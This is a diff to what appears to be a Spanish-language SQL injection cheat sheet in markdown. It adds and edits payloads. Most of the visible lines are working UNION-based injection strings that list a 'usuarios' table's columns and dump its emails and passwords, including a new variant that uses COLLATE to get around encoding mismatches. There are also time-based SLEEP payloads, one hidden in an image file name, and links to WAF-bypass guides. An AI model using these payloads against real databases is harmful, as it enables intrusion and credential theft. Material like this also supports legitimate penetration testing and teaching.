@@ -91,7 +91,7 @@ SELECT SLEEP(25)--
 # Columnas de la tabla "usuarios".
 -1' UNION SELECT column_name,2,3 FROM information_schema.columns WHERE table_name='usuarios'#
 
-# Contenido de la tabla usuarios (correo y contrasena). Extrae las 5 primeras filas.
+# Contenido de la tabla usuarios "correo y contrasena". Extrae las 5 primeras filas.
 -1' UNION SELECT correo,contrasena,3 FROM usuarios LIMIT 5#
 
 # XPath sin saber el numero de columnas.
@@ -115,7 +115,10 @@ SELECT SLEEP(25)--
 -1' UNION SELECT 1, GROUP_CONCAT(column_name SEPARATOR '<br>'), 3 FROM information_schema.columns WHERE table_schema=database() AND table_name='usuarios'#
 
 # Extraer datos de las columnas "correo y contrasena" de la tabla "usuarios" (5).
--1' UNION SELECT 1, GROUP_CONCAT(CONCAT(correo, 0x3a, contrasena) SEPARATOR '<br>'), 3 FROM usuarios LIMIT 5#
+-1' UNION SELECT 1, GROUP_CONCAT(CONCAT(correo, 0x3a, contrasena) SEPARATOR ':'), 3 FROM usuarios LIMIT 5#
+
+# Extraer datos de las columnas "correo y contrasena" de la tabla "usuarios" por codificacion de caracteres. 
+' UNION SELECT null,null,GROUP_CONCAT(CONCAT(correo COLLATE utf8mb4_unicode_ci,':',contrasena COLLATE utf8mb4_unicode_ci)) FROM usuarios --
 
 ```
 **`⃤⃞⃟⃤`** Lectura de archivos (3 columnas).
@@ -186,5 +189,10 @@ a';select+sleep(10); --z.png
 ```
 **`⃤⃞⃟⃤`** Links.
 
-(https://community.owasp.org/attacks/SQL_Injection_Bypassing_WAF)
+https://community.owasp.org/attacks/SQL_Injection_Bypassing_WAF
 
+https://www.slideshare.net/slideshow/advanced-sql-injection-eng/2532493
+
+https://www.slideshare.net/slideshow/sql-injection-bypassing-hand-book-blackrose/53458597
+
+https://www.slideshare.net/slideshow/new-techniques-in-sql-obfuscation/13595463
